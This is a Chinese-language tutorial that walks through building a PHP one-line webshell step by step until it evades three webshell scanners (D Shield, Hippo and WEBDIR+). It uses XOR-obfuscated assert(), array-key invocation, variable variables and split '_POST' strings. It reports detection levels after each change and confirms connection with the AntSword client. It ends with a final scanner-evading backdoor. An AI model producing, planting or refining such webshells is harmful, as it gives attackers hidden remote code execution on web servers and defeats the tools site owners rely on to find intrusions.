1 D盾免杀
    先从最简单的一句话开始。
<?phpassert($_POST['wk']);?>
    毫无疑问，可疑等级5。
    首先assert肯定是首先考虑绕过的，这里先尝试最常见的异或绕过。
<?php $a=('!'^'@').'ssert';$a($_POST['wk']);?>
    异或的原理是Ascii值的转换，！为33而@为64，转换原理是把33与64分别换成二进制，然后相加在转换成字符就是a，和后面代码拼接就可以成为assert，这种方式可以绕过waf，构成免杀php一句话。
    基于此，所以尝试构造我们的一句话。
<?php$s1='@'^'!';    //a$s2='-'^'^';    //s$s3='>'^'[';    //e$s4='['^')';    //r$s5='*'^'^';    //t$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert$d($_POST['wk']);?>
    得到了一些效果，危险等级降到了4。
    看检测说明，D盾识别出了assert后面携带可控的post变量，报了危险，那我们尝试执行个固定的命令。
<?php$s1='@'^'!';    //a$s2='-'^'^';    //s$s3='>'^'[';    //e$s4='['^')';    //r$s5='*'^'^';    //t$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert$d("echo 111");?>
    可疑程度为2，看来D盾对于assert的动态调用有检测，那我们可以尝试利用其他的形式来调用，这里我们尝试数组形式调用。
<?php$s1='@'^'!';    //a$s2='-'^'^';    //s$s3='>'^'[';    //e$s4='['^')';    //r$s5='*'^'^';    //t$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert$arr = [''=>$d($_POST['wk'])];?>
    可疑程度降到1了，继续排查可疑点，发现null值可以绕过。
<?php$s1='@'^'!';    //a$s2='-'^'^';    //s$s3='>'^'[';    //e$s4='['^')';    //r$s5='*'^'^';    //t$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert$arr = [null=>$d($_POST['wk'])];?>
    测试蚁剑连接，没问题。
2 河马绕过
    刚高兴没多久，把刚刚过D盾的一句话放到河马检测，报红了。
    猜测大概率是$_POST['wk']没过，这里我们尝试利用PHP特性，在PHP中${}，会把花括号里面的字符串转成变量名，利用这个特性我们构造一句话。
<?php$s1='@'^'!';    //a$s2='-'^'^';    //s$s3='>'^'[';    //e$s4='['^')';    //r$s5='*'^'^';    //t$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert$arr = [null=>$d(${"_POST"}['wk'])];?>
    测试蚁剑连接，没问题。
3 WEBDIR+绕过
    满怀期待的把刚刚过河马的一句话放到WEBDIR+检测，又又报后门了。
    此时猜测应该是POST这个字符串没过，尝试分组传输。
<?php$s1='@'^'!';    //a$s2='-'^'^';    //s$s3='>'^'[';    //e$s4='['^')';    //r$s5='*'^'^';    //t$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert$po = '_PO';$st = 'ST';$a = $po.$st;$arr = [null=>$d(${strval($a)}['wk'])];?>
    还是没过，接着继续尝试在拼接字符串中插入无效字符混淆，看看能不能过。
<?php$s1='@'^'!';    //a$s2='-'^'^';    //s$s3='>'^'[';    //e$s4='['^')';    //r$s5='*'^'^';    //t$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert$n = null;$po = '_PO';$st = 'ST';$a = $po.$n.$st;$arr = [null=>$d(${strval($a)}['wk'])];?>
    成功绕过，蚁剑连接测试，某得问题。
4 结尾
    至此，主流的三款webshell查杀工具均已绕过，最终免杀的一句话如下。
<?php$s1='@'^'!';    //a$s2='-'^'^';    //s$s3='>'^'[';    //e$s4='['^')';    //r$s5='*'^'^';    //t$d = $s1.$s2.$s2.$s3.$s4.$s5; //assert$n = null;$po = '_PO';$st = 'ST';$a = $po.$n.$st;$arr = [null=>$d(${strval($a)}['wk'])];?>
    小结：
1.异或绕过assert2.数组形式调用函数，$arr = [''=>func]3.${}可以将字符串转换成变量，strval()可以将变量转换成字符串4.null值可加入字符串混淆识别。
